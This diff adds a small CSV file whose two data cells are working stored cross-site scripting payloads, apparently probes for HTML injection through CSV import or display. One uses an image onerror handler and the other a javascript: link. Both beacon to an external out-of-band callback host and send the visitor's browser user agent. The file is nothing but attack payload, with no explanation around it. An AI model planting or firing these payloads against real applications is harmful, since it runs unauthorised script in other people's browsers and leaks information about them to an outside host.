@@ -1,0 +1,3 @@
+col1,col2
+normal,"<img src=x onerror=\"new Image().src='https://d964nnd54v9bmv1ife10kzegqiduur6tx.oast.fun/csvimg?ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now()\">"
+link,"<a href=\"javascript:new Image().src='https://d964nnd54v9bmv1ife10kzegqiduur6tx.oast.fun/csvjs?ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now()\" >click</a>"
